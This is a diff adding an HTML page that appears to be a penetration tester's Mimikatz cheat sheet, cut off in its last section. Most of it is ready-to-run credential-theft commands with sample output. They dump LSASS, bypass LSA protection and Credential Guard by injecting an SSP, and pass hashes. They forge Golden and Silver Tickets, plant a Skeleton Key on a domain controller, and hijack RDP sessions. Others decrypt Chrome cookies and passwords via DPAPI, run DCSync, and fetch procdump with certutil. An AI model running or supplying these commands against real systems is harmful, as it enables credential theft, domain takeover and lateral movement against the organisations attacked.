@@ -1,0 +1,653 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Mimikatz — Corey Clay</title>
+<meta name="description" content="Mimikatz reference — sekurlsa::logonpasswords, lsadump::sam/cache, LSA Protection bypass, Credential Guard bypass with misc::memssp, Pass-the-Hash, Golden/Silver Ticket, Skeleton Key, RDP takeover, DPAPI, DCSync.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;0,800;1,400&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --ink:#000000;--ink-2:#121318;--panel:#15171c;--panel-2:#191c22;
+    --line:#262a33;--line-soft:#1b1e24;
+    --fg:#e8eaed;--fg-dim:#b2b6bd;--muted:#868c98;--muted-2:#5f6672;
+    --signal:#9fef00;--signal-soft:rgba(159,239,0,.14);--signal-line:rgba(159,239,0,.34);
+    --green:#7fae7a;--red:#d17a6e;--blue:#7fa6c9;
+    --f-display:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    --f-body:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    --f-mono:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px);
+  }
+  *,*::before,*::after{box-sizing:border-box}
+  html{scroll-behavior:smooth;scroll-padding-top:calc(126px + env(safe-area-inset-top,0px))}
+  @media (prefers-reduced-motion:reduce){html{scroll-behavior:auto}}
+  body{margin:0;background:var(--ink);color:var(--fg);font-family:var(--f-body);font-size:15px;line-height:1.7;
+    -webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;}
+  .grid-fade{position:fixed;inset:0;pointer-events:none;z-index:0;background-color:var(--ink);background-image:linear-gradient(180deg,transparent 0%,var(--ink) 46%),linear-gradient(var(--line-soft) 1px,transparent 1px),linear-gradient(90deg,var(--line-soft) 1px,transparent 1px),radial-gradient(1100px 520px at 82% -8%,rgba(159,239,0,.05),transparent 60%);background-size:auto,64px 64px,64px 64px,auto;background-position:0 0,-1px -1px,-1px -1px,0 0}
+  a{color:inherit;text-decoration:none}
+  ::selection{background:var(--signal-soft);color:var(--fg)}
+  .wrap{max-width:900px;margin:0 auto;padding:0 24px;position:relative;z-index:1}
+
+  header.site{position:sticky;top:0;z-index:50;background:rgba(23,25,31,.97);
+    border-bottom:1px solid var(--line-soft);padding-top:env(safe-area-inset-top,0px)}
+  .bar{display:flex;align-items:center;justify-content:space-between;height:64px;max-width:900px;margin:0 auto;padding:0 24px}
+  .brand{display:flex;align-items:center;gap:11px;font-family:var(--f-mono);font-size:14px;letter-spacing:.02em}
+  .brand .dot{width:9px;height:9px;border-radius:50%;background:var(--signal);box-shadow:0 0 0 3px var(--signal-soft);flex:none}
+  .brand b{color:var(--fg);font-weight:700}
+  .brand span{color:var(--muted)}
+  nav.top{display:flex;gap:24px;font-family:var(--f-mono);font-size:13px;color:var(--muted)}
+  nav.top a{transition:color .18s ease}
+  nav.top a:hover,nav.top a.here{color:var(--signal)}
+  nav.top a:focus-visible,.brand:focus-visible{outline:2px solid var(--signal);outline-offset:4px;border-radius:2px}
+  @media (max-width:680px){nav.top a:not(.here):not(.home){display:none}}
+
+  .cs-hero{padding:56px 0 22px}
+  .cs-hero .kicker{font-family:var(--f-mono);font-size:12.5px;color:var(--signal);margin:0 0 10px}
+  .cs-hero .kicker a{color:var(--muted)}
+  .cs-hero .kicker a:hover{color:var(--signal)}
+  .cs-hero h1{font-family:var(--f-display);font-weight:600;font-size:clamp(30px,5vw,46px);letter-spacing:-.02em;
+    line-height:1.05;margin:0 0 14px;color:var(--fg)}
+  .cs-hero p{max-width:64ch;color:var(--fg-dim);font-size:18px;margin:0}
+
+  .sec-nav{position:sticky;top:64px;z-index:40;background:rgba(23,25,31,.98);
+    border-bottom:1px solid var(--line-soft);padding:11px 0}
+  .sec-nav .inner{display:flex;gap:7px;overflow-x:auto;scrollbar-width:none;max-width:900px;margin:0 auto;padding:0 24px}
+  .sec-nav .inner::-webkit-scrollbar{display:none}
+  .sec-nav a{font-family:var(--f-mono);font-size:11.5px;color:var(--muted);white-space:nowrap;
+    padding:5px 11px;border:1px solid var(--line);border-radius:20px;transition:.16s;flex:none}
+  .sec-nav a:hover,.sec-nav a:focus-visible{color:var(--signal);border-color:var(--signal-line)}
+  .sec-nav a.here{color:var(--signal);border-color:var(--signal-line);background:var(--signal-soft)}
+  .sec-nav a:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+
+  main{padding:12px 0 40px}
+  main h2{font-family:var(--f-display);font-weight:600;font-size:clamp(23px,3.2vw,30px);letter-spacing:-.01em;
+    color:var(--fg);margin:56px 0 8px;padding-top:20px;border-top:1px solid var(--line-soft);scroll-margin-top:130px}
+  main h2:first-of-type{border-top:0;margin-top:20px}
+  main h3{font-family:var(--f-display);font-weight:500;font-size:19px;color:var(--fg);margin:30px 0 10px}
+  main h4{font-family:var(--f-mono);font-size:14px;color:var(--signal);margin:22px 0 8px;letter-spacing:.01em}
+  main p{color:var(--fg-dim);margin:0 0 16px;max-width:74ch}
+  main strong{color:var(--fg);font-weight:600}
+  main a{color:var(--signal)}
+  main a:hover{text-decoration:underline}
+  main ul,main ol{color:var(--fg-dim);margin:0 0 18px;padding-left:22px;max-width:74ch}
+  main li{margin-bottom:6px}
+  main ul li::marker{color:var(--signal)}
+  main hr{border:0;border-top:1px solid var(--line-soft);margin:8px 0}
+
+  .code-wrap{position:relative;margin:0 0 18px}
+  main pre{background:var(--ink-2);border:1px solid var(--line);border-radius:8px;overflow-x:auto;
+    margin:0;padding:15px 17px;font-family:var(--f-mono);font-size:13px;line-height:1.7;color:var(--fg-dim)}
+  main pre code{font-family:var(--f-mono);background:none;padding:0;color:inherit;white-space:pre}
+  main :not(pre) > code{font-family:var(--f-mono);font-size:.86em;background:var(--panel-2);
+    border:1px solid var(--line-soft);border-radius:5px;padding:1px 6px;color:var(--signal)}
+  .copy{position:absolute;top:8px;right:8px;font-family:var(--f-mono);font-size:11px;color:var(--muted);
+    background:var(--panel);border:1px solid var(--line);border-radius:6px;padding:4px 10px;cursor:pointer;transition:.15s;opacity:.85}
+  .copy:hover,.copy:focus-visible{color:var(--signal);border-color:var(--signal-line);opacity:1}
+  .copy:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+  .copy.done{color:var(--green);border-color:rgba(127,174,122,.4)}
+
+  .table-scroll{overflow-x:auto;margin:0 0 20px;border:1px solid var(--line-soft);border-radius:8px}
+  main table{border-collapse:collapse;width:100%;font-size:14px;min-width:520px}
+  main th{font-family:var(--f-mono);font-size:12px;text-align:left;color:var(--signal);
+    background:var(--panel-2);padding:10px 14px;border-bottom:1px solid var(--line);font-weight:500;white-space:nowrap}
+  main td{padding:10px 14px;border-bottom:1px solid var(--line-soft);color:var(--fg-dim);vertical-align:top}
+  main tr:last-child td{border-bottom:0}
+  main td code{white-space:nowrap}
+
+  footer.site{border-top:1px solid var(--line-soft);padding:44px 0 60px;margin-top:40px}
+  .foot{display:flex;flex-wrap:wrap;justify-content:space-between;gap:20px;align-items:center}
+  .foot .f-brand{font-family:var(--f-mono);font-size:13px;color:var(--muted)}
+  .foot .f-brand b{color:var(--fg)}
+  .foot-links{display:flex;gap:22px;font-family:var(--f-mono);font-size:13px}
+  .foot-links a{color:var(--muted);transition:color .16s}
+  .foot-links a:hover,.foot-links a:focus-visible{color:var(--signal)}
+  .disclaimer{font-family:var(--f-mono);font-size:11.5px;color:var(--muted-2);margin:30px 0 0;max-width:74ch;line-height:1.7;
+    border-left:2px solid var(--line);padding-left:16px}
+
+  .hub{display:grid;grid-template-columns:repeat(2,1fr);gap:18px;margin:14px 0 10px}
+  @media (max-width:640px){.hub{grid-template-columns:1fr}}
+  .hub-card{display:block;border:1px solid var(--line);border-radius:11px;padding:24px 24px 22px;background:var(--panel);
+    transition:border-color .16s ease,transform .16s ease;position:relative}
+  .hub-card:hover{border-color:var(--signal-line);transform:translateY(-3px)}
+  .hub-card .idx{font-family:var(--f-mono);font-size:12px;color:var(--signal)}
+  .hub-card h3{font-family:var(--f-display);font-weight:600;font-size:21px;color:var(--fg);margin:8px 0 8px;letter-spacing:-.01em}
+  .hub-card p{font-family:var(--f-body);font-size:15.5px;color:var(--muted);margin:0 0 16px;line-height:1.5}
+  .hub-card .tags{display:flex;flex-wrap:wrap;gap:6px}
+  .hub-card .t{font-family:var(--f-mono);font-size:10.5px;color:var(--fg-dim);background:var(--panel-2);
+    border:1px solid var(--line-soft);padding:3px 8px;border-radius:5px}
+  .hub-card .go{position:absolute;top:22px;right:22px;font-family:var(--f-mono);font-size:16px;color:var(--muted);transition:.16s}
+  .hub-card:hover .go{color:var(--signal);transform:translateX(2px)}
+  .hub-card.soon{opacity:.6;pointer-events:none}
+  .hub-card.soon .go{content:''}
+  .hub-note{font-family:var(--f-mono);font-size:12.5px;color:var(--muted-2);margin-top:26px;border-left:2px solid var(--line);padding-left:16px}
+  .hub-empty{border:1px dashed var(--line);border-radius:12px;padding:52px 30px;text-align:center;margin:14px 0 10px}
+  .hub-empty .ico{font-family:var(--f-mono);font-size:13px;color:var(--signal);margin:0 0 12px}
+  .hub-empty h3{font-family:var(--f-display);font-weight:500;font-size:20px;color:var(--fg);margin:0 0 8px}
+  .hub-empty p{font-family:var(--f-body);font-size:15.5px;color:var(--muted);margin:0 auto;max-width:46ch;line-height:1.55}
+</style>
+</head>
+<body>
+<div class="grid-fade" aria-hidden="true"></div>
+
+<header class="site" id="top">
+  <div class="bar">
+    <a class="brand" href="index.html" aria-label="Home">
+      <span class="dot" aria-hidden="true"></span><b>corey.clay</b><span>/ tools & utilities / mimikatz</span>
+    </a>
+    <nav class="top" aria-label="Primary">
+      <a class="home" href="index.html">home</a>
+      <a href="index.html#log">log</a>
+      <a href="methodology.html">methodology</a>
+      <a href="enumeration.html">enumeration</a>
+      <a href="pre-exploitation.html">pre-exploitation</a>
+      <a href="exploitation.html">exploitation</a>
+      <a href="post-exploitation.html">post-exploitation</a>
+      <a class="here" href="tools-utilities.html" aria-current="page">tools &amp; utilities</a>
+      <a href="https://www.linkedin.com/in/corey-clay-664943b8/" target="_blank" rel="noopener">linkedin</a>
+    </nav>
+  </div>
+</header>
+
+<div class="cs-hero wrap">
+  <p class="kicker"><a href="tools-utilities.html">&lsaquo; tools &amp; utilities</a> &nbsp;/&nbsp; // raid-the-lsass</p>
+  <h1>Mimikatz</h1>
+  <p>Pulling secrets out of LSASS with Mimikatz — sekurlsa::logonpasswords with the full provider legend, lsadump::sam / cache / secrets, LSA Protection (RunAsPPL) workarounds, the misc::memssp Credential Guard bypass, Pass-the-Hash, Golden and Silver Tickets, Skeleton Key, RDP takeover and password extraction, Credential Manager and DPAPI, and DCSync.</p>
+</div>
+
+<nav class="sec-nav" aria-label="Jump to section">
+  <div class="inner">
+      <a href="#execute-commands">Execute Commands</a>
+      <a href="#extract-passwords">Extract Passwords</a>
+      <a href="#lsa-protection-workaround">LSA Protection Workaround</a>
+      <a href="#mini-dump">Mini Dump</a>
+      <a href="#pass-the-hash">Pass The Hash</a>
+      <a href="#golden-ticket">Golden Ticket</a>
+      <a href="#silver-ticket">Silver Ticket</a>
+      <a href="#skeleton-key">Skeleton Key</a>
+      <a href="#rdp-session-takeover">RDP Session Takeover</a>
+      <a href="#rdp-passwords">RDP Passwords</a>
+      <a href="#credential-manager-dpapi">Credential Manager &amp; DPAPI</a>
+      <a href="#dcsync">DCSync</a>
+      <a href="#commands-reference">Commands Reference</a>
+      <a href="#powershell-version">PowerShell Version</a>
+      <a href="#references">References</a>
+  </div>
+</nav>
+
+<main class="wrap">
+<h2 id="execute-commands">Execute Commands</h2>
+<h3>Single Command</h3>
+<pre><code class="language-powershell">PS C:\temp\mimikatz&gt; .\mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit
+</code></pre>
+<h3>Mimikatz Console (Interactive)</h3>
+<pre><code class="language-powershell">PS C:\temp\mimikatz&gt; .\mimikatz
+mimikatz # privilege::debug
+mimikatz # log
+mimikatz # sekurlsa::logonpasswords
+mimikatz # sekurlsa::wdigest
+</code></pre>
+<h2 id="extract-passwords">Extract Passwords</h2>
+<h3>Plaintext Credentials</h3>
+<blockquote>
+<p>Microsoft disabled lsass clear text storage since Win8.1 / 2012R2+. It was backported (KB2871997) as a reg key on Win7 / 8 / 2008R2 / 2012 but clear text is still enabled.</p>
+</blockquote>
+<pre><code class="language-powershell">mimikatz_command -f sekurlsa::logonPasswords full
+mimikatz_command -f sekurlsa::wdigest
+</code></pre>
+<h3><code>sekurlsa::logonpasswords</code> Output Provider Legend</h3>
+<p>Each active session prints a block per credential-provider. Grep for the parts that matter:</p>
+<table>
+<thead>
+<tr>
+<th>Provider</th>
+<th>Contains</th>
+<th>Usable?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>msv</code></td>
+<td>Primary NTLM + SHA1 + DPAPI master-key derivative</td>
+<td>YES — Pass-the-Hash with <code>NTLM :</code></td>
+</tr>
+<tr>
+<td><code>tspkg</code></td>
+<td>RDP-related (usually null on modern Win)</td>
+<td>rare — cleartext if present</td>
+</tr>
+<tr>
+<td><code>wdigest</code></td>
+<td>Digest-auth cleartext (needs <code>UseLogonCredential=1</code>)</td>
+<td>YES when non-null — plaintext password</td>
+</tr>
+<tr>
+<td><code>kerberos</code></td>
+<td>Kerberos service tickets + sometimes plaintext</td>
+<td>YES — plaintext password if non-null, or use tickets</td>
+</tr>
+<tr>
+<td><code>ssp</code></td>
+<td>Legacy Security Support Provider (usually null)</td>
+<td>rare</td>
+</tr>
+<tr>
+<td><code>credman</code></td>
+<td>Windows Credential Manager (RDP mstsc.exe saved creds)</td>
+<td>YES — see <code>Target :</code> + <code>Password :</code></td>
+</tr>
+<tr>
+<td><code>cloudap</code></td>
+<td>Azure AD / Entra Primary Refresh Token</td>
+<td>YES for AAD lateral (PRT abuse)</td>
+</tr>
+</tbody>
+</table>
+<p>Full worked example + one-line grep is in <a href="https://divyeshs-organization-1.gitbook.io/cpts-cheatsheet/post-exploitation/credential-dumping.md">../post-exploitation/credential-dumping/credential-dumping.md#<code>sekurlsa::logonpasswords</code>-Output-Provider-Legend</a>.</p>
+<h3><code>lsadump::cache</code> — Domain Cached Credentials (DCC2)</h3>
+<p>Different from <code>lsadump::sam</code> (local users). <code>cache</code> reads offline cached logons from <code>HKLM\SECURITY</code> — hashes of last-N domain users who logged in while the DC was reachable. Cracks slow (hashcat mode 2100, PBKDF2-SHA1).</p>
+<pre><code>mimikatz # privilege::debug
+mimikatz # token::elevate
+mimikatz # lsadump::cache
+## * Username : administrator
+## * Domain   : CORP.LOCAL
+## * Hash MsCache2 : d4e1c0b16bcf9d1e9a4c...
+</code></pre>
+<p>Format for hashcat: <code>$DCC2$10240#&lt;username&gt;#&lt;hash&gt;</code>.</p>
+<h3>Re-enable WDigest (Windows Server 2012+)</h3>
+<p>In <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest</code>, create a DWORD <code>UseLogonCredential</code> with the value 1:</p>
+<pre><code class="language-powershell">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1
+</code></pre>
+<p><strong>Conditions required</strong>:</p>
+<ul>
+<li>Win7 / 2008R2 / 8 / 2012 / 8.1 / 2012R2:</li>
+<li>Adding requires lock</li>
+<li>Removing requires signout</li>
+<li>Win10:</li>
+<li>Adding requires signout</li>
+<li>Removing requires signout</li>
+<li>Win2016:</li>
+<li>Adding requires lock</li>
+<li>Removing requires reboot</li>
+</ul>
+<h2 id="lsa-protection-workaround">LSA Protection Workaround</h2>
+<h3>LSA as Protected Process (RunAsPPL)</h3>
+<p>Check if LSA runs as a protected process:</p>
+<pre><code class="language-powershell">## Check if &quot;RunAsPPL&quot; is set to 0x1
+reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
+</code></pre>
+<p><strong>Exploitation</strong>:</p>
+<ol>
+<li>Upload <code>mimidriver.sys</code> from the official mimikatz repo to the same folder as <code>mimikatz.exe</code></li>
+<li>Import the driver:</li>
+</ol>
+<pre><code class="language-powershell">mimikatz # !+
+</code></pre>
+<ol start="3">
+<li>Remove protection flags from lsass.exe:</li>
+</ol>
+<pre><code class="language-powershell">mimikatz # !processprotect /process:lsass.exe /remove
+</code></pre>
+<ol start="4">
+<li>Run logonpasswords dump:</li>
+</ol>
+<pre><code class="language-powershell">mimikatz # privilege::debug    
+mimikatz # token::elevate
+mimikatz # sekurlsa::logonpasswords
+</code></pre>
+<ol start="5">
+<li>Re-add protection flags:</li>
+</ol>
+<pre><code class="language-powershell">mimikatz # !processprotect /process:lsass.exe
+</code></pre>
+<ol start="6">
+<li>Unload the driver:</li>
+</ol>
+<pre><code class="language-powershell">mimikatz # !-
+</code></pre>
+<p><strong>Alternative - PPLdump</strong>:</p>
+<pre><code class="language-powershell">PPLdump.exe [-v] [-d] [-f] &lt;PROC_NAME|PROC_ID&gt; &lt;DUMP_FILE&gt;
+PPLdump.exe lsass.exe lsass.dmp
+PPLdump.exe -v 720 out.dmp
+</code></pre>
+<h3>LSA Virtualized Process (Credential Guard / LSAISO)</h3>
+<p>Check if lsaiso.exe is running:</p>
+<pre><code class="language-powershell">tasklist |findstr lsaiso
+</code></pre>
+<p>Or from PowerShell (more reliable signal):</p>
+<pre><code class="language-powershell">Get-ComputerInfo | Select-String &quot;DeviceGuardSecurityServicesRunning&quot;
+## DeviceGuardSecurityServicesRunning : {CredentialGuard, HypervisorEnforcedCodeIntegrity}
+</code></pre>
+<p>When Credential Guard is on, <code>sekurlsa::logonpasswords</code> returns hashes wrapped in <code>LSA Isolated Data: NtlmHash</code> blobs — unusable directly.</p>
+<p><strong>Full Credential Guard Bypass Workflow (<code>misc::memssp</code>)</strong></p>
+<p><code>memssp</code> injects a rogue Security Support Provider into LSASS that logs every subsequent authentication in cleartext to disk. Bypasses Credential Guard because the SSP intercepts credentials AFTER decryption / BEFORE isolation.</p>
+<pre><code class="language-powershell">## 0. Confirm Credential Guard is on (see above)
+
+## 1. Attempt normal dump — confirms hashes are protected
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+## ... LSA Isolated Data: NtlmHash / Encrypted : &lt;blob&gt;
+
+## 2. Inject the memory-resident SSP (mimilib.dll in same folder)
+mimikatz # privilege::debug
+mimikatz # misc::memssp
+## Injected =)
+
+## 3. Force victim to re-auth. Any of these triggers a fresh capture:
+##      - Windows lock/unlock (Win+L then unlock)
+##      - RDP disconnect/reconnect
+##      - Logoff/logon
+##      - runas /user:CORP\admin cmd.exe
+
+## 4. Read captured cleartext creds
+PS&gt; type C:\Windows\System32\mimilsa.log
+## [00000000:00af2311] CORP\Administrator      QWERTY123!@#
+## [00000000:00b1dd77] CLIENTWK245\offsec      lab
+
+## 5. Cleanup — memssp is persistent until reboot; the log file is discoverable
+Remove-Item C:\Windows\System32\mimilsa.log -Force
+## Reboot to unload the injected SSP
+</code></pre>
+<p>Every user session and authentication gets logged with plaintext credentials to <code>c:\windows\system32\mimilsa.log</code> until the machine reboots.</p>
+<p>Report note it as a persistent artifact if you can't reboot the target.</p>
+<h2 id="mini-dump">Mini Dump</h2>
+<h3>Dump lsass with procdump</h3>
+<blockquote>
+<p>Windows Defender is triggered when a memory dump of lsass is operated. Using lsass's PID "bypasses" that.</p>
+</blockquote>
+<p><strong>HTTP method</strong>:</p>
+<pre><code class="language-powershell">certutil -urlcache -split -f http://live.sysinternals.com/procdump.exe C:\Users\Public\procdump.exe
+C:\Users\Public\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+</code></pre>
+<p><strong>SMB method (using PID)</strong>:</p>
+<pre><code class="language-powershell">net use Z: https://live.sysinternals.com
+tasklist /fi &quot;imagename eq lsass.exe&quot;   # Find lsass's pid
+Z:\procdump.exe -accepteula -ma $lsass_pid lsass.dmp
+</code></pre>
+<h3>Dump lsass with rundll32</h3>
+<pre><code class="language-powershell">rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\temp\lsass.dmp full
+</code></pre>
+<h3>Extract Credentials from Minidump</h3>
+<p><strong>Using Mimikatz</strong>:</p>
+<pre><code class="language-powershell">.\mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot;
+mimikatz # sekurlsa::logonPasswords
+</code></pre>
+<p><strong>Using Pypykatz</strong>:</p>
+<pre><code class="language-bash">pypykatz lsa minidump lsass.dmp
+</code></pre>
+<h2 id="pass-the-hash">Pass The Hash</h2>
+<pre><code class="language-powershell">mimikatz # sekurlsa::pth /user:SCCM$ /domain:IDENTITY /ntlm:e722dfcd077a2b0bbe154a1b42872f4e /run:powershell
+</code></pre>
+<h2 id="golden-ticket">Golden Ticket</h2>
+<p>Create a golden ticket to impersonate any user in the domain:</p>
+<pre><code class="language-powershell">.\mimikatz &quot;kerberos::golden /admin:ADMINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt&quot; exit
+</code></pre>
+<p><strong>Full example</strong>:</p>
+<pre><code class="language-powershell">.\mimikatz &quot;kerberos::golden /admin:DarthVader /domain:rd.lab.adsecurity.org /id:9999 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /startoffset:0 /endin:600 /renewmax:10080 /ptt&quot; exit
+</code></pre>
+<h2 id="silver-ticket">Silver Ticket</h2>
+<p>Similar to golden ticket but for a specific service. Grants access to a specific service without domain admin rights.</p>
+<pre><code class="language-powershell">kerberos::golden /user:&lt;USER&gt; /domain:&lt;DOMAIN&gt; /sid:&lt;DOMAIN_SID&gt; /target:&lt;TARGET_HOST&gt; /service:&lt;SERVICE&gt; /rc4:&lt;HASH&gt; /ptt
+</code></pre>
+<h2 id="skeleton-key">Skeleton Key</h2>
+<p>Inject a skeleton key (master password) into LSASS on a Domain Controller:</p>
+<pre><code class="language-powershell">privilege::debug
+misc::skeleton
+## map the share
+net use p: \\WIN-PTELU2U07KG\admin$ /user:john mimikatz
+## login as someone
+rdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab
+</code></pre>
+<h2 id="rdp-session-takeover">RDP Session Takeover</h2>
+<h3>Patch RDP Service</h3>
+<p>Use <code>ts::multirdp</code> to allow more than two simultaneous RDP users:</p>
+<p><strong>Enable privileges</strong>:</p>
+<pre><code class="language-powershell">privilege::debug 
+token::elevate 
+</code></pre>
+<p><strong>List RDP sessions</strong>:</p>
+<pre><code class="language-powershell">ts::sessions
+</code></pre>
+<p><strong>Hijack session</strong>:</p>
+<pre><code class="language-powershell">ts::remote /id:2 
+</code></pre>
+<h3>RDP Hijacking with tscon.exe</h3>
+<p>Run <code>tscon.exe</code> as SYSTEM to connect to any session without a password:</p>
+<pre><code class="language-powershell">## Get the Session ID
+query user
+create sesshijack binpath= &quot;cmd.exe /k tscon 1 /dest:rdp-tcp#55&quot;
+net start sesshijack
+</code></pre>
+<h2 id="rdp-passwords">RDP Passwords</h2>
+<h3>Verify if RDP Service is Running</h3>
+<pre><code class="language-ps1">sc queryex termservice
+tasklist /M:rdpcorets.dll
+netstat -nob | Select-String TermService -Context 1
+</code></pre>
+<h3>Extract RDP Passwords Manually</h3>
+<pre><code class="language-ps1">procdump64.exe -ma 988 -accepteula C:\svchost.dmp
+strings -el svchost* | grep Password123 -C3
+</code></pre>
+<h3>Extract RDP Passwords using Mimikatz</h3>
+<pre><code class="language-ps1">privilege::debug
+ts::logonpasswords
+</code></pre>
+<h2 id="credential-manager-dpapi">Credential Manager &amp; DPAPI</h2>
+<h3>List Stored Credentials</h3>
+<pre><code class="language-powershell">## Check the folder to find credentials
+dir C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Credentials\*
+
+## check the file with mimikatz
+./mimikatz dpapi::cred /in:C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0
+
+## find master key
+./mimikatz !sekurlsa::dpapi
+
+## use master key
+./mimikatz dpapi::cred /in:C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
+</code></pre>
+<h3>Chrome Cookies &amp; Credentials</h3>
+<p><strong>Extract saved cookies</strong>:</p>
+<pre><code class="language-powershell">dpapi::chrome /in:&quot;%localappdata%\Google\Chrome\User Data\Default\Cookies&quot; /unprotect
+dpapi::chrome /in:&quot;C:\Users\kbell\AppData\Local\Google\Chrome\User Data\Default\Cookies&quot; /masterkey:9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b
+</code></pre>
+<p><strong>Extract saved credentials in Chrome</strong>:</p>
+<pre><code class="language-powershell">dpapi::chrome /in:&quot;%localappdata%\Google\Chrome\User Data\Default\Login Data&quot; /unprotect
+</code></pre>
+<h3>Task Scheduler Credentials</h3>
+<pre><code class="language-powershell">vault::cred /patch
+## Output shows:
+## TargetName : Domain:batch=TaskScheduler:Task:{CF3ABC3E-4B17-ABCD-0003-A1BA192CDD0B}
+## UserName   : DOMAIN\user
+## Credential : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+</code></pre>
+<h3>Vault Credentials</h3>
+<pre><code class="language-powershell">vault::cred /in:C:\Users\demo\AppData\Local\Microsoft\Vault\&quot;
+</code></pre>
+<h2 id="dcsync">DCSync</h2>
+<p>Extract domain credentials without code execution on the DC:</p>
+<pre><code class="language-powershell">mimikatz # lsadump::dcsync /user:&lt;USERNAME&gt;
+mimikatz # lsadump::dcsync /domain:&lt;DOMAIN&gt; /user:krbtgt
+</code></pre>
+<p>This will dump the NTLM hash of the specified user without needing to run code on the DC.</p>
+<h2 id="commands-reference">Commands Reference</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Definition</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>CRYPTO::Certificates</code></td>
+<td>List/export certificates</td>
+</tr>
+<tr>
+<td><code>KERBEROS::Golden</code></td>
+<td>Create golden/silver/trust tickets</td>
+</tr>
+<tr>
+<td><code>KERBEROS::List</code></td>
+<td>List all user tickets (TGT and TGS) in user memory. No special privileges required. Similar to "klist"</td>
+</tr>
+<tr>
+<td><code>KERBEROS::PTT</code></td>
+<td>Pass the ticket. Inject a stolen or forged Kerberos ticket (golden/silver/trust)</td>
+</tr>
+<tr>
+<td><code>LSADUMP::DCSync</code></td>
+<td>Ask a DC to synchronize an object (get password data for account). No need to run code on DC</td>
+</tr>
+<tr>
+<td><code>LSADUMP::LSA</code></td>
+<td>Retrieve SAM/AD enterprise credentials. Dump all domain credentials from DC or lsass.dmp. Use <code>/name:krbtgt</code> to get specific account</td>
+</tr>
+<tr>
+<td><code>LSADUMP::SAM</code></td>
+<td>Dump local credentials from Security Account Manager (SAM) database</td>
+</tr>
+<tr>
+<td><code>LSADUMP::Cache</code></td>
+<td>Dump domain-cached credentials (MSCache2 / DCC2) from <code>HKLM\SECURITY</code>. hashcat mode 2100</td>
+</tr>
+<tr>
+<td><code>LSADUMP::Secrets</code></td>
+<td>Dump LSA secrets (DPAPI master keys, service account cleartext creds)</td>
+</tr>
+<tr>
+<td><code>LSADUMP::Trust</code></td>
+<td>Retrieve Trust Auth Information. Dumps trust keys for all associated trusts</td>
+</tr>
+<tr>
+<td><code>MISC::AddSid</code></td>
+<td>Add SIDHistory to user account</td>
+</tr>
+<tr>
+<td><code>MISC::MemSSP</code></td>
+<td>Inject a malicious Windows SSP to log locally authenticated credentials</td>
+</tr>
+<tr>
+<td><code>MISC::Skeleton</code></td>
+<td>Inject Skeleton Key into LSASS on Domain Controller. Enables master password authentication</td>
+</tr>
+<tr>
+<td><code>PRIVILEGE::Debug</code></td>
+<td>Get debug rights. Required for many Mimikatz commands</td>
+</tr>
+<tr>
+<td><code>SEKURLSA::Ekeys</code></td>
+<td>List Kerberos encryption keys</td>
+</tr>
+<tr>
+<td><code>SEKURLSA::Kerberos</code></td>
+<td>List Kerberos credentials for all authenticated users</td>
+</tr>
+<tr>
+<td><code>SEKURLSA::Krbtgt</code></td>
+<td>Get Domain Kerberos service account (KRBTGT) password data</td>
+</tr>
+<tr>
+<td><code>SEKURLSA::LogonPasswords</code></td>
+<td>List all available provider credentials. Shows recently logged on users</td>
+</tr>
+<tr>
+<td><code>SEKURLSA::Pth</code></td>
+<td>Pass-the-Hash and Over-Pass-the-Hash</td>
+</tr>
+<tr>
+<td><code>SEKURLSA::Tickets</code></td>
+<td>List all available Kerberos tickets for all authenticated users</td>
+</tr>
+<tr>
+<td><code>TOKEN::List</code></td>
+<td>List all tokens of the system</td>
+</tr>
+<tr>
+<td><code>TOKEN::Elevate</code></td>
+<td>Impersonate a token. Elevate to SYSTEM or find domain admin token</td>
+</tr>
+</tbody>
+</table>
+<h2 id="powershell-version">PowerShell Version</h2>
+<p>Run Mimikatz in memory (no binary on disk) with PowerShell:</p>
+<ul>
+<li><a href="https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1">Invoke-Mimikatz</a> from PowerShellEmpire</li>
